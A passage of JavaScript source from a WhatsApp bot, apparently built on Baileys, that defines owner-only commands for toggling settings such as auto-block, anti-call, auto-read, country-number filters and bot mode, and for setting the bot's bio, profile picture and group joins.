                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'poll': {
	if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
                return await replygcyuta(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
            try {
            let options = []
            for (let i of opt.split(',')) {
                options.push(i)
            }
            await Yuta.sendMessage(m.chat, {
                poll: {
                    name: poll,
                    values: options
                }
            })
            } catch {
            	replygcyuta(
                    `Mention question and atleast 2 options\nExample: ${prefix}poll Who is best admin?|Xeon,Cheems,Doge...`
                )
                }
        }
        break
			case 'autoblock':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                    db.data.settings[botNumber].autoblocknum = true
                    replygcyuta(`Successfully Changed Auto-Block To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autoblocknum = false
                    replygcyuta(`Successfully Changed Auto-Block To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlygroup':
            case 'onlygc':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                    db.data.settings[botNumber].onlygrub = true
                    replygcyuta(`Successfully Changed Onlygroup To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlygrub = false
                    replygcyuta(`Successfully Changed Onlygroup To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyprivatechat':
            case 'onlypc':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                    db.data.settings[botNumber].onlypc = true
                    replygcyuta(`Successfully Changed Only-Pc To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlypc = false
                    replygcyuta(`Successfully Changed Only-Pc To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindia':
            case 'onlyindianumber':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindia = true
                    replygcyuta(`Successfully Changed Only-Indian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindia = false
                    replygcyuta(`Successfully Changed Only-Indian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'onlyindo':
            case 'onlyindonumber':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                    db.data.settings[botNumber].onlyindo = true
                    replygcyuta(`Successfully Changed Only-Indonesian To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].onlyindo = false
                    replygcyuta(`Successfully Changed Only-Indonesian To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'setautoblock':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!text) return replygcyuta(`Example : ${prefix + command} 92`)
                global.autoblocknumber = text
                replygcyuta(`Auto-Block number successfully changed to ${text}`)
                break
                case 'setantiforeign':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (!text) return replygcyuta(`Example : ${prefix + command} 91`)
                global.antiforeignnumber = text
                replygcyuta(`Anti-foreign number successfully changed to ${text}`)
                break
			case 'autoswview':
    case 'autostatusview':{
             if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               
               if (args[0] === 'on') {
                  db.data.settings[botNumber].antiswview = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].antiswview = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
    case 'anticall': {
             if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
               
               if (args[0] === 'on') {
                  db.data.settings[botNumber].anticall = true
                  replygcyuta(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.settings[botNumber].anticall = false
                  replygcyuta(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
			case 'autorecordtype':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecordtype = true
                    replygcyuta(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecordtype = false
                    replygcyuta(`Successfully changed Auto-RecordingTyping to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autorecord':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                
                if (q === 'on') {
                    db.data.settings[botNumber].autorecord = true
                    replygcyuta(`Successfully changed Auto-Recording to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autorecord = false
                    replygcyuta(`Successfully changed Auto-Recording to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'autotype':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                
                if (q === 'on') {
                    db.data.settings[botNumber].autotype = true
                    replygcyuta(`Successfully changed Auto-Typing to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autotype = false
                    replygcyuta(`Successfully changed Auto-Typing to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'autoread':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q === 'on') {
                    db.data.settings[botNumber].autoread = true
                    replygcyuta(`Successfully changed autoread to ${q}`)
                } else if (q === 'off') {
                    db.data.settings[botNumber].autoread = false
                    replygcyuta(`Successfully changed autoread to ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
            case 'autobio':
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                
                if (q == 'on') {
                    db.data.settings[botNumber].autobio = true
                    replygcyuta(`Successfully Changed AutoBio To ${q}`)
                } else if (q == 'off') {
                    db.data.settings[botNumber].autobio = false
                    replygcyuta(`Successfully Changed AutoBio To ${q}`)
                } else {
                	let msg = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./YutaMedia/theme/YutaOkkotsu.jpg')}, { upload: Yuta.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: saluran,
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await Yuta.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            break
			case 'self': case 'public': case 'mode': {
                if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
                if (q == 'on') {
                Yuta.public = true
                replygcyuta('*Successful in Changing To Public Usage*')
                } else if (q == 'off') {
                Yuta.public = false
                replygcyuta('*Successful in Changing To Self Usage*')
                } else {
                	let button = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'SELECT 🌹',
							sections: [{
								title: 'BOT MODE',
								rows: [
									{ title: 'Public', description: 'Bot Usage', id: `${prefix+command} on` },
									{ title: 'Self', description: 'Bot Usage', id: `${prefix+command} off` },
								]
							}]
						}
					}]
                	await Yuta.sendButtonMsg(m.chat, 'BOT MODE', ucpv2, 'Please choose 🌹', null, button, m);
                	}
                }
                break
			case 'setbio': case 'setbotbio': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta(`Where's the text??`)
				Yuta.setStatus(q)
				replygcyuta(`*Bio has been changed to ${q}*`)
			}
			break
	case 'setppbot': case 'setbotpp': {
if (!YutaTheCreator) return replygcyuta(mess.only.owner)
if (!quoted) return replygcyuta(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (!/image/.test(mime)) return replygcyuta(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replygcyuta(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var medis = await Yuta.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(medis)
await Yuta.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replygcyuta(`Success`)
} else {
var memeg = await Yuta.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replygcyuta(`Success`)
}
}
break
			case 'join': {
				if (!YutaTheCreator) return replygcyuta("*[ sʏsᴛᴇᴍ ] ᴍᴀᴀғ ɪɴɪ ᴋʜᴜsᴜs ᴏᴡɴᴇʀ")
				if (!text) return replygcyuta('Enter Group Link!')
				if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replygcyuta('Link Invalid!')
				const result = args[0].split('https://chat.whatsapp.com/')[1]
				replygcyuta(mess.loading)
				await Yuta.groupAcceptInvite(result).catch((res) => {
					if (res.data == 400) return replygcyuta('Group Not Found❗');
					if (res.data == 401) return replygcyuta('Bot Kicked From The Group❗');
					if (res.data == 409) return replygcyuta('Bots Have Joined the Group❗');
					if (res.data == 410) return replygcyuta('Group URL Has Been Reset❗');
